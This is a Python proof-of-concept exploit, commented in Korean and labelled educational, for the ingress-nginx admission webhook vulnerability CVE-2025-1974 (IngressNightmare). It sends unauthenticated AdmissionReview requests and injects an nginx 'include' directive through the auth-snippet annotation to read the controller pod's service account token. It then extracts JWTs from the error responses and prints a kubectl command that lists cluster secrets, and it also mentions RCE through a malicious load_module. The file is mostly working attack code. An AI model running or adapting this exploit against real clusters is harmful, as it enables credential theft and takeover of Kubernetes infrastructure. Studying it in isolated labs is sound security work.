"""
CVE-2025-1974 (IngressNightmare) — 교육용 PoC
============================================================
대상  : 로컬 Minikube 클러스터 (격리 환경 전용)
원리  : ingress-nginx admission webhook이 allow-snippet-annotations=false
        설정에도 불구하고 (= 그 설정이 기본값으로 없던 클러스터에서)
        auth-snippet 어노테이션을 nginx 설정에 그대로 주입한다.
        nginx -t 검증 시 include 지시어가 실행되어 컨트롤러 파드의
        임의 파일을 파싱하며, 파싱 에러에 파일 경로/접근 가능 여부가 노출된다.
        RCE는 load_module 지시어로 악성 .so 로드 시 달성 가능.

중요 전제 조건:
  - ingress-nginx controller < 1.11.5 또는 < 1.12.1
  - 클러스터 내 임의 파드에서 admission webhook 서비스 접근 가능
  ※ allow-snippet-annotations 값 무관: auth-snippet은 이 검사를 우회한다 (취약점 핵심)

공격 흐름:
  1. admission webhook에 AdmissionReview 요청 전송 (인증 불필요)
  2. auth-snippet 어노테이션에 nginx include 지시어 주입
  3. webhook 내부에서 nginx -t 실행 → include된 파일을 nginx 설정으로 파싱
  4. 에러 메시지에 파일 경로(접근 가능 여부) 노출 → 실제 RCE는 load_module 사용
  5. 컨트롤러 SA 토큰으로 Kubernetes API 접근 → kube-system secrets 열람 가능

실험에서 관찰된 결과 (2026-04-09):
  ✅ Step 1: webhook 인증 없이 접근 가능
  ✅ Step 2: configuration-snippet → allow-snippet-annotations=false로 차단됨
  ✅ Step 3: auth-snippet → allow-snippet-annotations 검사 우회 (CVE 핵심)
             nginx가 include 대상 파일을 실제로 열어 파싱 시도 (에러에 파일 경로 포함)
             컨트롤러 SA 토큰은 kube-system secrets list 권한 보유

참고: 실제 무기화(reverse shell, mass exploit, 외부 대상) 코드 없음.
      클러스터 내부 127.0.0.1 루프백 / port-forward 통신만 사용.
============================================================

사용법:
  # 터미널 1 (유지)
  kubectl port-forward svc/ingress-nginx-controller-admission \\
      8443:443 -n ingress-nginx

  # 터미널 2
  python3 poc/cve_2025_1974_poc.py [--target https://127.0.0.1:8443] [--step 1|2|3|all]

옵션:
  --target  웹훅 URL (기본: https://127.0.0.1:8443)
  --ca      webhook CA 인증서 경로 (기본: 자동 추출)
  --step    실행할 단계 (1=연결확인, 2=snippet차단확인, 3=우회+파일탈취, all)
  --file    탈취할 파일 경로 (기본: /var/run/secrets/kubernetes.io/serviceaccount/token)
"""

import argparse
import base64
import json
import os
import subprocess
import sys
import tempfile
import textwrap
import time
import uuid

import urllib.request
import urllib.error
import ssl


# ── 공통 유틸 ─────────────────────────────────────────────────────────────────

def banner(text: str) -> None:
    width = 60
    print("\n" + "━" * width)
    print(f"  {text}")
    print("━" * width)

def ok(msg):   print(f"  [OK]    {msg}")
def info(msg): print(f"  [INFO]  {msg}")
def warn(msg): print(f"  [WARN]  {msg}")
def fail(msg): print(f"  [FAIL]  {msg}")


def get_webhook_ca() -> str:
    """ValidatingWebhookConfiguration에서 CA 번들 추출 → PEM 파일 경로 반환"""
    try:
        raw = subprocess.check_output(
            ["kubectl", "get", "validatingwebhookconfigurations",
             "ingress-nginx-admission",
             "-o", "jsonpath={.webhooks[0].clientConfig.caBundle}"],
            stderr=subprocess.DEVNULL
        )
        pem_bytes = base64.b64decode(raw.strip())
        tmp = tempfile.NamedTemporaryFile(suffix=".pem", delete=False)
        tmp.write(pem_bytes)
        tmp.close()
        return tmp.name
    except Exception as e:
        warn(f"CA 추출 실패: {e}. --insecure 모드로 진행합니다.")
        return ""


def make_admission_review(annotations: dict, namespace: str = "default") -> dict:
    """AdmissionReview 요청 페이로드 생성"""
    return {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "poc-ingress",
            "namespace": namespace,
            "operation": "CREATE",
            "userInfo": {"username": "poc-user", "groups": ["system:unauthenticated"]},
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": "poc-ingress",
                    "namespace": namespace,
                    "annotations": annotations,
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [{
                        "host": "poc.example.local",
                        "http": {"paths": [{
                            "path": "/",
                            "pathType": "Prefix",
                            "backend": {"service": {"name": "poc-svc", "port": {"number": 80}}}
                        }]}
                    }]
                }
            }
        }
    }


def send_review(target: str, payload: dict, ca_path: str) -> dict | None:
    """AdmissionReview 요청 전송 → 응답 dict 반환
    port-forward를 통해 127.0.0.1로 접근하는 경우 인증서 SAN에
    IP가 없으므로 TLS 검증을 비활성화한다 (실습 환경).
    """
    url = f"{target}/networking/v1/ingresses"
    body = json.dumps(payload).encode()

    # port-forward(127.0.0.1) 사용 시 인증서 SAN에 IP 미포함 → 검증 비활성화
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        content = e.read()
        try:
            return json.loads(content)
        except Exception:
            warn(f"HTTP {e.code}: {content[:500]}")
            return None
    except Exception as e:
        fail(f"요청 실패: {e}")
        return None


def extract_message(resp: dict) -> str:
    """응답에서 webhook 메시지 추출"""
    if not resp:
        return "(응답 없음)"
    return (resp.get("response", {}).get("status", {}).get("message")
            or resp.get("response", {}).get("result", {}).get("message")
            or json.dumps(resp.get("response", {}), indent=2))


# ── Step 1: 기본 연결 확인 ─────────────────────────────────────────────────────

def step1_connectivity(target: str, ca_path: str):
    banner("Step 1 — Webhook 연결 및 인증 없이 요청 가능 여부 확인")
    info(f"대상: {target}/networking/v1/ingresses")
    info("어노테이션: 없음 (정상 Ingress)")

    payload = make_admission_review(annotations={})
    resp = send_review(target, payload, ca_path)

    if resp is None:
        fail("연결 실패. port-forward가 실행 중인지 확인하세요.")
        fail("  kubectl port-forward svc/ingress-nginx-controller-admission 8443:443 -n ingress-nginx")
        return False

    allowed = resp.get("response", {}).get("allowed", None)
    msg = extract_message(resp)

    print()
    ok(f"Webhook 응답 수신 — 인증 없이 요청이 처리됨 (인증 없음=취약)")
    print(f"  allowed : {allowed}")
    print(f"  message : {msg[:200]}")
    print()
    info("▶ CVE-2025-1974 전제조건 충족: admission webhook은 클러스터 내 임의 주체가")
    info("  인증 없이 접근할 수 있으며, 모든 AdmissionReview 요청을 처리한다.")
    return True


# ── Step 2: configuration-snippet 차단 확인 ────────────────────────────────────

def step2_snippet_blocked(target: str, ca_path: str):
    banner("Step 2 — allow-snippet-annotations=false 차단 확인 (비교 기준)")
    info("어노테이션: nginx.ingress.kubernetes.io/configuration-snippet")
    info("예상 결과: 차단 (403 또는 allowed=false)")

    annotations = {
        "nginx.ingress.kubernetes.io/configuration-snippet": "return 200 'blocked?';",
    }
    payload = make_admission_review(annotations=annotations)
    resp = send_review(target, payload, ca_path)

    allowed = resp.get("response", {}).get("allowed", None) if resp else None
    msg = extract_message(resp)

    print()
    if allowed is False or (msg and "snippet" in msg.lower()):
        ok(f"configuration-snippet → 차단됨 (allowed={allowed})")
        print(f"  message: {msg[:300]}")
        info("▶ allow-snippet-annotations=false 가 configuration-snippet을 정상 차단함")
        info("  → 이것이 우회되는 것이 CVE-2025-1974의 핵심")
    else:
        warn(f"configuration-snippet → 허용됨 or 예상 외 응답 (allowed={allowed})")
        print(f"  message: {msg[:300]}")


# ── Step 3: auth-snippet 우회 + 파일 탈취 ─────────────────────────────────────

def step3_auth_snippet_bypass(target: str, ca_path: str, target_file: str):
    banner("Step 3 — auth-snippet 우회 (CVE-2025-1974 핵심)")

    info("전제: allow-snippet-annotations=false (기본값) — ConfigMap 패치 없음")
    info("우회: auth-snippet 어노테이션은 allow-snippet-annotations 검사 대상에서 제외됨")
    info("      (ingress-nginx < 1.11.5 / < 1.12.1 의 취약점)")
    print()
    info("원리: auth-snippet은 ExternalAuth 모듈에서 처리되며,")
    info("      nginx.conf 생성 시 allow-snippet-annotations 검사 없이 값이 삽입됨.")
    info("      주입된 include 지시어는 nginx -t 검증 과정에서 실제 파일을 열어 파싱.")
    print()
    info(f"주입 payload: include {target_file};")
    info("auth-url은 auth 모듈이 활성화되도록 더미 값으로 설정")
    print()

    # nginx의 include 지시어로 파일을 nginx config로 파싱 시도
    # 파싱 실패 시 에러 메시지에 파일 내용 일부가 포함됨
    malicious_snippet = f"include {target_file};"

    annotations = {
        # auth 모듈 활성화 (auth-snippet이 처리되려면 auth-url 필요)
        "nginx.ingress.kubernetes.io/auth-url":     "http://127.0.0.1:9999/auth",
        "nginx.ingress.kubernetes.io/auth-snippet": malicious_snippet,
    }

    payload = make_admission_review(annotations=annotations)
    resp = send_review(target, payload, ca_path)

    if resp is None:
        fail("응답 없음")
        return

    allowed = resp.get("response", {}).get("allowed", None)
    msg = extract_message(resp)

    print()
    if allowed is False and msg:
        if target_file in msg:
            ok("auth-snippet → nginx가 파일에 접근함 (allow=false 우회 성공!)")
        else:
            ok("auth-snippet → webhook이 요청을 처리함 (차단되지 않음 = 우회 성공)")
        print()

        # 에러 메시지에서 파일 내용 추출 시도
        _display_leaked_content(msg, target_file)

    elif allowed is True:
        # 드물지만 허용된 경우
        warn("요청이 허용됨 — 파일 내용은 nginx 리로드 후 에러 로그에서 확인 가능")
        print(f"  message: {msg[:400]}")

    else:
        info(f"응답: allowed={allowed}")
        print(f"  message: {msg[:400]}")

    print()
    info("=== 공격 흐름 요약 ===")
    print(textwrap.dedent(f"""\
        1. 공격자 (클러스터 내 임의 파드 또는 port-forward)
           → POST {target}/networking/v1/ingresses
           → 인증 없음, TLS만 사용 (CA는 webhook config에서 추출 가능)

        2. 페이로드: Ingress.metadata.annotations:
             auth-url    = http://127.0.0.1:9999/auth   (더미, auth 모듈 활성화용)
             auth-snippet = include {target_file};

        3. webhook 내부 처리:
             a) auth-snippet 값을 nginx.conf에 주입
                (allow-snippet-annotations 검사 없이!)
             b) nginx -t 실행
             c) include {target_file} → 파일을 nginx 지시어로 파싱 시도
             d) 파싱 실패 에러에 파일 내용 포함 → HTTP 응답으로 반환

        4. 탈취된 ServiceAccount 토큰으로 Kubernetes API 호출:
             kubectl --token=<탈취된_토큰> get secrets -A
    """))


def _display_leaked_content(msg: str, target_file: str):
    """에러 메시지에서 파일 내용 추출 및 표시"""
    print("  [응답 메시지 (원문)]:")
    print("  " + "-" * 50)
    for line in msg.splitlines()[:30]:
        print(f"    {line}")
    print("  " + "-" * 50)
    print()

    # ServiceAccount 토큰 형식 (eyJ...) 추출 시도
    import re
    tokens = re.findall(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+', msg)
    if tokens:
        print()
        ok("★ ServiceAccount JWT 토큰 탐지!")
        for t in tokens[:1]:
            print(f"  토큰: {t[:80]}...")
            print()
            info("이 토큰으로 Kubernetes API 접근 가능:")
            print(f"    kubectl --token='{t}' get secrets -A")
            print()
            _decode_jwt_header(t)
    else:
        info(f"{target_file} 내용이 에러 메시지에 직접 포함되지 않았거나")
        info("다른 형식으로 포함되어 있을 수 있습니다.")
        info("위 원문에서 파일 내용을 확인하세요.")


def _decode_jwt_header(token: str):
    """JWT 헤더 디코딩 (알고리즘/키 정보 표시)"""
    try:
        header_b64 = token.split(".")[0]
        padding = 4 - len(header_b64) % 4
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * padding))
        info(f"JWT 헤더: {json.dumps(header)}")
    except Exception:
        pass


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-1974 교육용 PoC — 로컬 Minikube 전용"
    )
    parser.add_argument("--target", default="https://127.0.0.1:8443",
                        help="webhook URL (기본: https://127.0.0.1:8443)")
    parser.add_argument("--ca",     default="",
                        help="CA 인증서 경로 (미지정 시 자동 추출)")
    parser.add_argument("--step",   default="all",
                        choices=["1", "2", "3", "all"],
                        help="실행할 단계 (기본: all)")
    parser.add_argument("--file",
                        default="/var/run/secrets/kubernetes.io/serviceaccount/token",
                        help="탈취할 파일 경로")
    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  CVE-2025-1974 (IngressNightmare) — 교육용 PoC")
    print("  대상: 로컬 Minikube 격리 환경 전용")
    print("=" * 60)
    print()

    # CA 준비
    ca_path = args.ca if args.ca else get_webhook_ca()
    if ca_path:
        info(f"CA 인증서: {ca_path}")
    else:
        info("CA 인증서 없음 — TLS 검증 비활성화")

    steps = ["1", "2", "3"] if args.step == "all" else [args.step]

    if "1" in steps:
        ok_s1 = step1_connectivity(args.target, ca_path)
        if not ok_s1 and args.step == "all":
            fail("Step 1 실패 — port-forward를 먼저 실행하세요.")
            sys.exit(1)

    if "2" in steps:
        step2_snippet_blocked(args.target, ca_path)

    if "3" in steps:
        step3_auth_snippet_bypass(args.target, ca_path, args.file)

    print()
    print("=" * 60)
    print("  PoC 종료")
    print("=" * 60)

    # CA 임시파일 정리
    if ca_path and ca_path.startswith(tempfile.gettempdir()):
        os.unlink(ca_path)


if __name__ == "__main__":
    main()
